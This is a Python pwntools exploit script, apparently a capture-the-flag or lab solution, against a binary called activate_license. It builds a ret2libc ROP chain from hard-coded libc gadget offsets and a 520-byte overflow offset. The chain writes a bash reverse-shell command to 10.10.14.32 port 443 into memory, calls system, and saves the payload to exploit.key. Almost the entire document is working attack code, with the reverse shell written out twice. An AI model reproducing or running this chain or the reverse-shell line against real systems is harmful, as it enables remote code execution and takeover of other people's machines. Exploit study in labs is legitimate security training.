#!/usr/bin/python

from pwn import *


"""
What kind of Buffer overflow method we need to perform
to gain a shell system("bash -c 'bash -i >& /dev/tcp/10.10.14.32/443 0>&1'")

❯ checksec --file=activate_license
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   100 Symbols       No    0               3               activate_license

As we can see, that file has protection as:

    - Full RELRO
    - NX
    - PIE
That information says us that we can't introduce shellcode in the stack due to NX
ROP is disabled due to the random address in the code running on the server

so we have access to download the libc binary to use it to get a simple shell
"""

# to ret2libc we need the actual address in the binary and the libc library
base_activate_license =0x55d84befd000
base_libc = 0x7f5d877df000

# Now we need a space to write the code
# ❯ rabin2 -S activate_license
# 23  0x00003000   0x10 0x00004000   0x10 -rw- 0x3   PROGBITS    .data
writable = base_activate_license + 0x00004000

# now the address for system
# ❯ objdump -D libc-2.31.so | grep system
# 0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
#    48e53:       74 0b                   je     48e60 <__libc_system@@GLIBC_PRIVATE+0x10>
# 000000000012d5e0 <svcerr_systemerr@@GLIBC_2.2.5>:
#   12d637:       75 05                   jne    12d63e <svcerr_systemerr@@GLIBC_2.2.5+0x5e>

system = base_libc + 0x00048e50

# now we need to play with gadgets
# rdi, rsi, rdx, rcx, r8, r9


# ❯ ropper -f libc-2.31.so --search "pop rdi; ret"
# 0x0000000000026796: pop rdi; ret; 

pop_rdi = p64(base_libc + 0x00026796)

# ❯ ropper -f libc-2.31.so --search "pop rsi; ret"
# 0x000000000002890f: pop rsi; ret; 
pop_rsi = p64(base_libc + 0x0002890f)


# now mov the actual value from rsi to rdi
# ❯ ropper -f libc-2.31.so --search "mov [rdi], rsi"
# 0x00000000000603b2: mov qword ptr [rdi], rsi; ret; 
mov_rdi_rsi = p64(base_libc + 0X000603b2)

# offset
offset = 520

exploit = b''
exploit += b'A'*offset


cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.32/443 0>&1'"

for x in range(0, len(cmd), 8):
    exploit += pop_rdi
    exploit += p64(writable + x)
    exploit += pop_rsi
    exploit += cmd[x: x+8].ljust(8, b"\x00")
    exploit += mov_rdi_rsi

exploit += pop_rdi
exploit += p64(writable)
exploit += p64(system)


with open("exploit.key", "wb") as file:
    file.write(exploit)




